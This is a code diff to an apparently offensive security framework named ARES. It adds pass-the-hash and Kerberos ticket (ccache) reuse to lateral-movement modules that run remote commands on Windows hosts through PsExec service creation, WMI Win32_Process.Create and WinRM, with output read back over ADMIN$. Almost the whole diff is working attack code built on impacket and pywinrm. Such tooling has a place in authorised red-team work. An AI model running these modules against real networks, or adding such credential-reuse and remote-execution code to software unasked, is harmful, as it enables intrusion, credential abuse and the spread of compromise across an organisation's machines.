@@ -74,6 +74,22 @@ class LateralResult:
     output:       str = ""
     error:        str = ""
     duration_ms:  float = 0.0
+    auth_type:    str = "ntlm"
+    kerberos_used: bool = False
+
+
+@dataclass
+class AuthStrategy:
+    """Resolved authentication strategy for lateral movement."""
+    auth_type:    str             # "kerberos" | "ntlm" | "password"
+    do_kerberos:  bool            = False
+    ccache_path:  str | None      = None
+    username:     str             = ""
+    domain:       str             = ""
+    password:     str             = ""
+    lmhash:       str             = ""
+    nthash:       str             = ""
+    kdc_host:     str             = ""
 
 
 # ── Base Lateral Module ────────────────────────────────────────────────────────
@@ -85,6 +101,80 @@ class BaseLateralModule(BaseModule):
     MODULE_AUTHOR    = "ARES Team <team@ares-framework.io>"
     OPSEC_LEVEL      = OpsecLevel.MEDIUM
     MITRE_TECHNIQUES = []
+
+    @classmethod
+    def resolve_auth_strategy(
+        cls,
+        secret: str,
+        domain: str = "",
+        username: str = "",
+        **kwargs: Any,
+    ) -> AuthStrategy:
+        """
+        Resolve authentication strategy: Kerberos ticket reuse vs NTLM hash vs cleartext password.
+        Supports:
+          - ccache files (path to .ccache or KRB5CCNAME env)
+          - Kerberos tickets (do_kerberos flag)
+          - NTLM hashes (32-char hex, or lm:nt format)
+          - Cleartext passwords
+        """
+        import os
+        lmhash, nthash = "", ""
+        password = secret or ""
+        ccache_path = kwargs.get("ccache_path")
+        do_kerberos = bool(kwargs.get("do_kerberos") or kwargs.get("kerberos"))
+        kdc_host = kwargs.get("kdc_host") or domain or ""
+
+        # 1. Detect ccache file path or ticket indicator
+        if secret:
+            clean_secret = str(secret).strip()
+            if clean_secret.startswith("ccache:"):
+                ccache_path = clean_secret[7:].strip()
+                do_kerberos = True
+                password = ""
+            elif clean_secret.endswith(".ccache") and not (":" in clean_secret and len(clean_secret) == 65):
+                ccache_path = clean_secret
+                do_kerberos = True
+                password = ""
+
+        # Check environment variable KRB5CCNAME if ccache_path not explicitly passed
+        if not ccache_path and os.environ.get("KRB5CCNAME"):
+            env_cc = os.environ["KRB5CCNAME"].strip()
+            if env_cc:
+                if env_cc.startswith("FILE:"):
+                    env_cc = env_cc[5:]
+                ccache_path = env_cc
+                if do_kerberos or (kwargs.get("prefer_kerberos", True) and domain):
+                    do_kerberos = True
+
+        if do_kerberos and ccache_path:
+            os.environ["KRB5CCNAME"] = ccache_path
+
+        # 2. If not Kerberos (or for fallback credential), parse NTLM hash vs password
+        if password:
+            clean_pwd = str(password).strip()
+            if len(clean_pwd) == 32 and all(c in "0123456789abcdefABCDEF" for c in clean_pwd):
+                nthash = clean_pwd
+                password = ""
+            elif len(clean_pwd) in (65, 33) and ":" in clean_pwd:
+                parts = clean_pwd.split(":")
+                if len(parts) == 2 and all(all(c in "0123456789abcdefABCDEF" for c in p) for p in parts if p):
+                    lmhash, nthash = parts[0], parts[1]
+                    password = ""
+
+        auth_type = "kerberos" if do_kerberos else ("ntlm" if (nthash or lmhash) else "password")
+
+        return AuthStrategy(
+            auth_type=auth_type,
+            do_kerberos=do_kerberos,
+            ccache_path=ccache_path,
+            username=username,
+            domain=domain,
+            password=password,
+            lmhash=lmhash,
+            nthash=nthash,
+            kdc_host=kdc_host,
+        )
 
     async def move(
         self,
@@ -110,6 +200,7 @@ class BaseLateralModule(BaseModule):
         Default lateral movement feasibility evaluation:
         Checks target reachability, credentials, and noise profile compatibility.
         """
+        import os
         from ares.modules.base import FeasibilityReport
         from ares.core.campaign import NoiseProfile
         from ares.core.security import sanitize_hostname
@@ -126,11 +217,17 @@ class BaseLateralModule(BaseModule):
 
         has_password = bool(getattr(ctx, "params", {}).get("password") or getattr(ctx, "params", {}).get("secret"))
         has_hash = bool(getattr(ctx, "params", {}).get("nt_hash") or getattr(ctx, "params", {}).get("hash"))
+        has_ticket = bool(
+            getattr(ctx, "params", {}).get("ccache_path")
+            or getattr(ctx, "params", {}).get("ticket")
+            or os.environ.get("KRB5CCNAME")
+            or (getattr(ctx, "params", {}).get("secret") and str(getattr(ctx, "params", {}).get("secret")).strip().endswith(".ccache"))
+        )
         has_vault = bool(getattr(ctx, "vault", None) and getattr(getattr(ctx, "vault", None), "_store", None))
         has_cred = bool(getattr(ctx, "best_credential", lambda: None)())
 
-        if not (has_password or has_hash or has_vault or has_cred):
-            blockers.append("No credentials (password, NTLM hash, or vault entry) available for lateral authentication")
+        if not (has_password or has_hash or has_vault or has_cred or has_ticket):
+            blockers.append("No credentials (password, NTLM hash, Kerberos ticket, or vault entry) available for lateral authentication")
             score -= 0.4
 
         noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
@@ -155,6 +252,7 @@ class BaseLateralModule(BaseModule):
         Enforce target and credentials before any network connection.
         Applied to all lateral modules: psexec, wmiexec, dcom, winrm, rdp, ssh.
         """
+        import os
         from ares.core.context import ExecutionContext
         from ares.core.errors import ModuleValidationError
         if not isinstance(ctx, ExecutionContext):
@@ -175,17 +273,24 @@ class BaseLateralModule(BaseModule):
                 "provide the IP or hostname of the remote host.",
                 module_id=self.MODULE_ID, field="target",
             )
-        # Credentials: need either password, NTLM hash, or vault credential
+        # Credentials: need either password, NTLM hash, vault credential, or Kerberos ticket
         has_password = bool(ctx.params.get("password") or ctx.params.get("secret"))
         has_hash     = bool(ctx.params.get("nt_hash") or ctx.params.get("hash"))
+        has_ticket   = bool(
+            ctx.params.get("ccache_path")
+            or ctx.params.get("ticket")
+            or os.environ.get("KRB5CCNAME")
+            or (ctx.params.get("secret") and str(ctx.params.get("secret")).strip().endswith(".ccache"))
+            or (ctx.params.get("password") and str(ctx.params.get("password")).strip().endswith(".ccache"))
+        )
         has_vault    = bool(
             getattr(ctx, "vault", None) and
             getattr(getattr(ctx, "vault", None), "_store", None)
         )
-        if not (has_password or has_hash or has_vault):
+        if not (has_password or has_hash or has_vault or has_ticket):
             raise ModuleValidationError(
                 f"{self.MODULE_ID} requires credentials - "
-                "pass 'password', 'nt_hash' (NTLM), or provide a vault credential.",
+                "pass 'password', 'nt_hash' (NTLM), 'ccache_path' (Kerberos), or provide a vault credential.",
                 module_id=self.MODULE_ID, field="password",
             )
         await super().validate(ctx)
@@ -461,21 +566,13 @@ class PsExecLateral(BaseLateralModule):
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
             )
 
-        lmhash, nthash = "", ""
-        password = secret
-        if len(secret) == 32 or (len(secret) == 65 and ":" in secret):
-            parts = secret.split(":")
-            if len(parts) == 2:
-                lmhash, nthash = parts[0], parts[1]
-            else:
-                nthash = secret
-            password = ""
+        auth = self.resolve_auth_strategy(secret, domain, username, **kwargs)
 
         loop = asyncio.get_running_loop()
 
         def _psexec_exec() -> tuple[bool, str, str]:
             """
-            Full PSExec via impacket SCM:
+            Full PSExec via impacket SCM with Kerberos ticket reuse and NTLM fallback:
               1. SMB connect + auth
               2. Connect to Service Control Manager via RPC
               3. Create + start temp service to execute command
@@ -497,7 +594,12 @@ class PsExecLateral(BaseLateralModule):
                 rpct = transport.DCERPCTransportFactory(
                     f"ncacn_np:{target}[\\pipe\\svcctl]"
                 )
-                rpct.set_credentials(username, password, domain, lmhash, nthash)
+                if auth.do_kerberos:
+                    try:
+                        rpct.set_kerberos(True, kdcHost=auth.kdc_host or domain or target)
+                    except Exception as krb_rpc_exc:
+                        logger.debug("psexec_kerberos_rpc_setup_warn", error=str(krb_rpc_exc)[:80])
+                rpct.set_credentials(username, auth.password, domain, auth.lmhash, auth.nthash)
                 rpct.set_connect_timeout(15)
                 dce = rpct.get_dce_rpc()
                 dce.connect()
@@ -529,7 +631,14 @@ class PsExecLateral(BaseLateralModule):
                 _time.sleep(2)   # give command time to run
                 try:
                     smb = SMBConnection(target, target, timeout=10)
-                    smb.login(username, password, domain, lmhash, nthash)
+                    if auth.do_kerberos:
+                        try:
+                            smb.kerberosLogin(domain, username, auth.password, auth.lmhash, auth.nthash, kdcHost=auth.kdc_host or domain or target)
+                        except Exception as krb_smb_exc:
+                            logger.debug("psexec_kerberos_smb_fallback_ntlm", error=str(krb_smb_exc)[:80])
+                            smb.login(username, auth.password, domain, auth.lmhash, auth.nthash)
+                    else:
+                        smb.login(username, auth.password, domain, auth.lmhash, auth.nthash)
                     import io
                     buf = io.BytesIO()
                     smb.getFile("ADMIN$", f"Temp\\{svc_name}.txt", buf.write)
@@ -551,7 +660,13 @@ class PsExecLateral(BaseLateralModule):
                     # Valid creds but no SCM access - try just verifying ADMIN$ access
                     try:
                         smb2 = SMBConnection(target, target, timeout=10)
-                        smb2.login(username, password, domain, lmhash, nthash)
+                        if auth.do_kerberos:
+                            try:
+                                smb2.kerberosLogin(domain, username, auth.password, auth.lmhash, auth.nthash, kdcHost=auth.kdc_host or domain or target)
+                            except Exception:
+                                smb2.login(username, auth.password, domain, auth.lmhash, auth.nthash)
+                        else:
+                            smb2.login(username, auth.password, domain, auth.lmhash, auth.nthash)
                         smb2.disconnectTree(smb2.connectTree("ADMIN$"))
                         smb2.logoff()
                         return True, "local_admin", f"Admin access confirmed (SCM blocked) on {target}"
@@ -596,6 +711,8 @@ class PsExecLateral(BaseLateralModule):
                 username=username, domain=domain,
                 success=False, error=str(exc)[:300],
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos,
             )
 
         return LateralResult(
@@ -606,6 +723,8 @@ class PsExecLateral(BaseLateralModule):
             output=output,
             error="" if success else output,
             duration_ms=round((time.monotonic() - t0) * 1000, 2),
+            auth_type=auth.auth_type,
+            kerberos_used=auth.do_kerberos and success,
         )
 
 
@@ -702,21 +821,13 @@ class WmiExecLateral(BaseLateralModule):
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
             )
 
-        lmhash, nthash = "", ""
-        password = secret
-        if len(secret) in (32, 33) or (len(secret) == 65 and ":" in secret):
-            parts = secret.split(":")
-            if len(parts) == 2:
-                lmhash, nthash = parts[0], parts[1]
-            else:
-                nthash = secret
-            password = ""
+        auth = self.resolve_auth_strategy(secret, domain, username, **kwargs)
 
         loop = asyncio.get_running_loop()
 
         def _wmi_exec() -> tuple[bool, str, str]:
             """
-            Real WMI execution via DCOM Win32_Process.Create.
+            Real WMI execution via DCOM Win32_Process.Create with Kerberos support and NTLM fallback.
             Output captured by writing to a temp file then reading back via SMB.
             Timeout enforced on the overall sync block.
             """
@@ -733,18 +844,39 @@ class WmiExecLateral(BaseLateralModule):
                 from impacket.dcerpc.v5.dcom  import wmi as wmimod
                 from impacket.dcerpc.v5.dtypes import NULL
 
-                dcom = DCOMConnection(
-                    target,
-                    username=username,
-                    password=password,
-                    domain=domain,
-                    lmhash=lmhash,
-                    nthash=nthash,
-                    oxidResolver=True,
-                    doKerberos=False,
-                )
-                iInterface = dcom.CoCreateInstanceEx(wmimod.CLSID_WbemLevel1Login,
-                                                     wmimod.IID_IWbemLevel1Login)
+                # Connect via DCOM with Kerberos support & NTLM fallback
+                try:
+                    dcom = DCOMConnection(
+                        target,
+                        username=username,
+                        password=auth.password,
+                        domain=domain,
+                        lmhash=auth.lmhash,
+                        nthash=auth.nthash,
+                        oxidResolver=True,
+                        doKerberos=auth.do_kerberos,
+                        kdcHost=auth.kdc_host or domain or target,
+                    )
+                    iInterface = dcom.CoCreateInstanceEx(wmimod.CLSID_WbemLevel1Login,
+                                                         wmimod.IID_IWbemLevel1Login)
+                except Exception as krb_err:
+                    if auth.do_kerberos and (auth.password or auth.nthash):
+                        logger.debug("wmi_kerberos_failed_fallback_ntlm", error=str(krb_err)[:80])
+                        dcom = DCOMConnection(
+                            target,
+                            username=username,
+                            password=auth.password,
+                            domain=domain,
+                            lmhash=auth.lmhash,
+                            nthash=auth.nthash,
+                            oxidResolver=True,
+                            doKerberos=False,
+                        )
+                        iInterface = dcom.CoCreateInstanceEx(wmimod.CLSID_WbemLevel1Login,
+                                                             wmimod.IID_IWbemLevel1Login)
+                    else:
+                        raise
+
                 iWbemLevel1Login = wmimod.IWbemLevel1Login(iInterface)
                 iWbemServices    = iWbemLevel1Login.NTLMLogin(
                     f"\\\\{target}\\root\\cimv2", NULL, NULL
@@ -759,7 +891,13 @@ class WmiExecLateral(BaseLateralModule):
 
                 # Read output via SMB
                 smb = SMBConnection(target, target, timeout=10)
-                smb.login(username, password, domain, lmhash, nthash)
+                if auth.do_kerberos:
+                    try:
+                        smb.kerberosLogin(domain, username, auth.password, auth.lmhash, auth.nthash, kdcHost=auth.kdc_host or domain or target)
+                    except Exception:
+                        smb.login(username, auth.password, domain, auth.lmhash, auth.nthash)
+                else:
+                    smb.login(username, auth.password, domain, auth.lmhash, auth.nthash)
                 import io
                 buf = io.BytesIO()
                 try:
@@ -797,6 +935,8 @@ class WmiExecLateral(BaseLateralModule):
                 username=username, domain=domain, success=False,
                 error=f"WMI execution timed out after {timeout_s}s",
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos,
             )
         except Exception as exc:
             logger.warning("wmiexec_failed", target=target, error=str(exc)[:200])
@@ -806,6 +946,8 @@ class WmiExecLateral(BaseLateralModule):
                 username=username, domain=domain, success=False,
                 error=str(exc)[:300],
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos,
             )
 
         return LateralResult(
@@ -816,6 +958,8 @@ class WmiExecLateral(BaseLateralModule):
             output=output,
             error="" if success else output,
             duration_ms=round((time.monotonic() - t0) * 1000, 2),
+            auth_type=auth.auth_type,
+            kerberos_used=auth.do_kerberos and success,
         )
 
 
@@ -888,6 +1032,8 @@ class WinRMLateral(BaseLateralModule):
 
         logger.info("winrm_attempt", target=target, port=port, username=username, domain=domain)
 
+        auth = self.resolve_auth_strategy(secret, domain, username, **kwargs)
+
         try:
             import winrm
 
@@ -897,9 +1043,32 @@ class WinRMLateral(BaseLateralModule):
                 target_user = f"{domain}\\{username}" if domain else username
                 protocol = "ssl" if use_ssl else "ntlm"
                 endpoint = f"http{'s' if use_ssl else ''}://{target}:{port}/wsman"
+
+                # Try Kerberos transport if ticket available or requested
+                if auth.do_kerberos:
+                    try:
+                        session = winrm.Session(
+                            endpoint,
+                            auth=(target_user, auth.password),
+                            transport="kerberos",
+                            server_cert_validation="ignore" if use_ssl else "validate",
+                        )
+                        r = session.run_cmd(command)
+                        stdout = r.std_out.decode("utf-8", errors="replace").strip()
+                        stderr = r.std_err.decode("utf-8", errors="replace").strip()
+                        success = r.status_code == 0
+                        priv = "SYSTEM" if "NT AUTHORITY\\SYSTEM" in stdout else (
+                            "Administrator" if "Administrators" in stdout else "user"
+                        )
+                        return success, priv, stdout
+                    except Exception as krb_exc:
+                        logger.debug("winrm_kerberos_failed_fallback_ntlm", error=str(krb_exc)[:80])
+                        if not auth.password and not secret:
+                            raise
+
                 session = winrm.Session(
                     endpoint,
-                    auth=(target_user, secret),
+                    auth=(target_user, auth.password or secret),
                     transport=protocol,
                     server_cert_validation="ignore" if use_ssl else "validate",
                 )
@@ -921,6 +1090,8 @@ class WinRMLateral(BaseLateralModule):
                 success=success, privilege=privilege,
                 output=output[:500],
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos and success,
             )
 
         except ImportError:
@@ -930,6 +1101,8 @@ class WinRMLateral(BaseLateralModule):
                 username=username, domain=domain, success=False,
                 error="pywinrm not installed - run: pip install pywinrm",
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos,
             )
         except Exception as exc:
             logger.warning("winrm_failed", target=target, error=str(exc)[:200])
@@ -939,6 +1112,8 @@ class WinRMLateral(BaseLateralModule):
                 username=username, domain=domain, success=False,
                 error=str(exc)[:300],
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
+                auth_type=auth.auth_type,
+                kerberos_used=auth.do_kerberos,
             )
 
 
